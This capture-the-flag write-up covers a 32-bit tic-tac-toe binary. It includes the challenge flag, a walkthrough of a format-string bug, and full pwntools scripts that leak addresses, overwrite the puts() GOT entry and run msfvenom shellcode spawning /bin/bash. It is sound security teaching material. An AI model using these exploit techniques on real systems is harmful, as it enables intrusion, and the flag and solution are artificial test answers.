

# Challenge Name

Tic Tac Oh Noh!

# Point Value and Assessed Difficulty

250  
Medium

# Category

Network Exploitation

# Challenge Prompt/Question


Play our best tic-tac-toe - our AI format is unbeatable. You can try, but the flags are all ours!



* [binary](tic_tac_oh_noh)

# Hints


* __Hint 1:__ *(Look for printf leak)* The tic’s and tac’s may be hidden in the format.
* __Hint 2:__ *(Find a way to read the raw bytes!)* Sometimes terminals lie to you about their output.

# Key


flag{i_B3@t_t1c$_&__7ac$_and-ALL=i/g0t*was-this_f1@g!}


# Walkthrough

This challenge requires knowledge of format string exploits, knowledge of the stack, and 32-bit assembly. Solving this challenge requires the discovery of a ```printf()``` leak/vulnerability that is hidden behind a special ANSI escape sequence.

## Concept Development

This challenge requires ```libc6:i386-dev``` in order to work due to it being hosted on a 64-bit Linux VM. The goal behind developing this challenge was to demonstrate why you shouldn't always trust what you see in the terminal and help competitors discover how to read raw data while exploiting a vulnerable program. After, moving past the ANSI escape sequence the next challenge is for the competitor to discover how data can eventually end up in the buffer passed to ```printf()``` and then take advantage of it.

## Discovery

The binary is a 32-bit ELF executable that is not stripped: `tic_tac_oh_noh: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.32, not stripped`. It also has some light protection on the binary in the form of canaries, a non-executable stack, and partial RELRO.

> CANARY    : ENABLED <p>
FORTIFY   : disabled<p>
NX        : ENABLED<p>
PIE       : disabled<p>
RELRO     : Partial<p>

When we first look at the output from the binary we have a few options that we want to take note of where we interact with the program. 1) We can provide a name; 2) We can select our character type ("X" or "O"); and 3) we can make a move on the Tic-Tac-Toe board.

![intro view](images/intro_view.png)

When examining the program we discover that when we provide a name it is placed into a 0x200 byte buffer in the heap. The same buffer is used inside a loop for moves inside the Tic-Tac-Toe game. Last, the same buffer is later copied into another buffer in the heap. The "X" or "O" goes is received while inside a function called `initialize_board`, which appears to create the board we play on and assign other initial values. Last, each move we make gets placed into the name buffer and then a pointer moves to the next position in the buffer. So this is something that we should keep track of:

> We can possibly ship around some of the data in the name field, and parts of it are overwritten during the actual game itself. If we can someone get access to this area of memory we may be able to take control of EIP or put executable code here.

A quick inspection of the ELF symbol table shows us that this program uses ```memmove()```, ```memcpy()```, ```malloc()```, ```mmap()```, ```free()```, and ```munmap()```. With that in mind, a large amount of this use is done at the tail of the program. At the tail-end of the program we can see there are several possible scenarios following ```memcpy()```:

1. We can try and exploit a use-on-free() condition
2. We can try and exploit a double-free() condition
3. We can try and exploit the printf() function that uses the buffer we kept track of from above.

![exploit options](images/exploit_options.png)

The easiest of the three options is the printf() vulnerability - also known as a format string exploit. [\[1\]](#endnote1) First, we can verify our suspected vulnerability with strange input. Looking at our options for input we should choose either the name or the input for a move. For the name buffer, we can input up to 512d bytes, but then later on in the program the name buffer is used again by the actual moves for the game -> and is offset by 1 byte. In order to get to the ```printf()``` vulnerability we have to pass through at least 1 move. However, as soon as we do that the name buffer begins getting overwritten.

![1 byte problem](images/off-by-one_input.png)

To make problems even worse, the buffer for data for each move is limited to 3 bytes, which will be null terminated by ```fgets()```. [\[2\]](#endnote2) This really limits us to passing two bytes at a time. There's also one other problem - in the printf() statement before out possible vulnerability there is a strange ANSI sequence ```[8m``` which hides out output. [\[3\]](#endnote3) This means we will have to find a way to read the output other than visually inside our terminal - such as through piping into hexdump -C or using another source that can read and print raw bytes, such as python.

![raw data leak](images/printf_leak.png)

## Solution
In order to beat this challenge we need to take everything learned so far -
* Leak useful information from ```printf()``` then build our exploit
    * First we select A for our first name and hit enter then craft a small python string such that it looks like ```python -c 'print "AAA" + ".%x"*165'```
    * We can see that by sending a large set of %x modifiers to printf we gain knowledge of data residing in the stack.
    * At this point we can just count or automate the process to find that 41414141 (the hex representation of AAAA) is at position 72 in the stack arguments
    * This leak tells us we can control something with ```printf()```
* ```printf()``` allows a format string exploit
* validate the offset - there will always be at least one extra byte in the header
* ensure we target the executable area created by ```mmap()```
* Overwrite the correct address in the GOT table so we can use it as a trampoline to our shellcode

![printf leak](images/stack_target.png)

First, our trampoline will be setup in the GOT. When exploiting I always try to get code redirection at the first available opportunity. The first function that follows ```printf()``` is ```puts()```. ```objdump -R tic_tac_oh_noh``` shows us that the address for ```puts()``` @ __0x804b030__. However, we can also calculate it from the leak as well from the 12th stack position leaked by ```printf()```. __0x804c008__ is an address in the heap allocated by the first ```malloc()``` - which means the offset can be calculated from the this address. [\[4\]](#endnote4) You can see the proof solution code for this in the leak script on lines 36-37 where we prepare the exploit using 2x word sized writes.

> Exploit Progress:<p>
puts_half_word + puts_half_word

Next, to craft the target area we want to use for the puts() GOT entry overwrite. This can be done by using format string modifiers such as %d, %c, and %n. However, this isn't going to be a format string tutorial [*__[check here for that](https://www.exploit-db.com/docs/28476.pdf)__*].
In our solution we are able to discover the address for mmap by leaking the the first stored argument on the stack following ```printf()```. There we find the address of the executable space is at __0xf7fd6000__, but we need to ensure that ALSR is not turned on, so run it a 2nd time. Now that we know it is a reliable address we can use the format string vulnerability. We calculate the address into a decimal value to provide some chosen format modifiers in lines 157-158 of our leaking script.

> Exploit Progress:<p>
puts_half_word + puts_half_word + format_string_exploit(write to stack location pointer) + format_string_exploit(write to stack location pointer)

![printf leak](images/printf_leak_info.png)

Last we need shellcode, ```msfvenom --payload linux/x86/exec CMD="/bin/bash" --format python --bad-chars "\x00\x0a\x0d\x0c"``` did this for us. If good shellcode already exists then there is no need to craft it ourselves. The output can be seen on lines 16-24 of our exploit code. We place this at the beginning of the format exploit string.

> Exploit Progress:<p>
shellcode + puts_half_word + puts_half_word + format_string_exploit(write to stack location pointer) + format_string_exploit(write to stack location pointer)

Last, we have to make sure there is some padding so we don't have to be as precise, and recalculate our target positions so we are properly aligned (stack position 72 will no longer work at this point). In order to do that we count how many bytes we have in our payload (72+16=88) divide it by 4 (x86 32-bit uses 4 byte addresses right?) which gives us 22. __NOTE* This MUST be evenly divisible otherwise your exploit may not work.__ Now after adjusting out offset our stack_target location will be at offset 94. Run our script and get the flag!

![get the flag](images/done.png)

----

# Proof of Exploit/Solution
## Leak Script
```python
from pwn import *
import socket

context.log_level = 'info'

c = remote("104.196.106.59", 7221)
#c = process('./tic_tac_oh_noh')

# gdb.attach(c, """
#     display /xw 0x56558034
#     b *0x56555d0b
#     b *0x56555d11
#     c
#     """)

def send_exploit(arg):
    for x in range(len(arg)):
        c.sendline(arg[x])

log.warning("Gathering leak information for exploit")
c.sendline("A")
c.sendline("x")
send_exploit('AAA' + ".%x"*100)
c.sendline("q")
c.recvuntil("\x1b[8m")
useful_data = c.recv()
log.info(useful_data)
heap_location = "0x" + useful_data[70:77]
executable_location = "0x" + useful_data[5:13]
log.warning("""
Found the following addresses:
\tHeap is located at  \t {0}
\tMmap area located at\t {1}\n""".format(heap_location, executable_location))
c.close

puts_plt_upper = p32(int(heap_location,16)-0x1008+0x30)
puts_plt_lower = p32(int(heap_location,16)-0x1008+0x2e)
#72x
log.warning("Building exploit\n")
log.info("Locating puts() in the PLT @ {}\n".format(hex(int(heap_location,16)-0x1008+0x30)))
log.info("Building shellcode\n")

second_half = (int(executable_location, 16) & 0xffff)
first_half = ((int(executable_location, 16) >> 16) - second_half)

log.warning(str(first_half) + "\n" + str(second_half))

```

## Exploit Script
``` python
from pwn import *
import socket

context.log_level = 'info'

c = remote("104.196.106.59", 7221)
#c = process('./tic_tac_oh_noh')

# gdb.attach(c, """
#     display /xw 0x56558034
#     b *0x56555d0b
#     b *0x56555d11
#     c
#     """)

# msfvenom --payload linux/x86/exec CMD="/bin/bash" --format python --bad-chars "\x00\x0a\x0d\x0c"

buf =  "A"*15
buf += "\x29\xc9\x83\xe9\xf4\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += "\x76\x0e\x6d\xdf\x22\x22\x83\xee\xfc\xe2\xf4\x07\xd4"
buf += "\x7a\xbb\x3f\xb9\x4a\x0f\x0e\x56\xc5\x4a\x42\xac\x4a"
buf += "\x22\x05\xf0\x40\x4b\x03\x56\xc1\x70\x85\xd5\x22\x22"
buf += "\x6d\xf0\x40\x4b\x03\xf0\x40\x43\x1e\xb7\x22\x75\x3e"
buf += "\x56\xc3\xef\xed\xdf\x22\x22"



def send_exploit(arg):
    for x in range(len(arg)):
        c.sendline(arg[x])

log.warning("Re-connecting and sending exploit\n")

loc = "0x804b030"
puts_plt_upper = p32(int(loc,16)+2)
puts_plt_lower = p32(int(loc,16))

exploit = buf + puts_plt_lower + puts_plt_upper + "%{0}c%{1}$hn%{2}c%{3}$hn".format((24576-9-(len(buf))), 94, (38909), 95)

c.sendline("A")
c.sendline("x")
send_exploit(exploit)
c.sendline("q")
c.interactive()
c.close()
```

----

# Endnotes

<a name="endnote1">[1]</a>: A format string exploit takes advantage of evaluating an input string as a command by a vulnerable program. This can result in executeable code, reading of the stack, and other odd behaviors.  [Read More Here](https://www.exploit-db.com/docs/28476.pdf)

<a name="endnote2">[2]</a>: The ```fgets()``` function reads at most one less than the number of characters specified by size from the given stream and stores them in the string str.  Reading stops when a newline character is found, at end-of-file or error.  The newline, if any, is retained.  If any characters are read and there is no error, a `\0' character is appended to end the string.

<a name="endnote3">[3]</a>: ANSI escape sequences are used by terminals in order to define functions, change graphics, control cursor movement, and other interesting functions for display or keyboards. In most cases they are portable across implementations. [Read More Here](http://ascii-table.com/ansi-escape-sequences.php)

<a name="endnote4">[4]</a>: ```malloc()``` implementations generally begin with a brk or sbrk system call which places the heap at the first page (or the first 0x1000 bytes) following the end of the global offset table. The structure of the code executing in memory is very predictable and allows for calculating of relative offsets. [Read More Here](http://stackoverflow.com/questions/19676688/how-malloc-and-sbrk-works-in-unix)
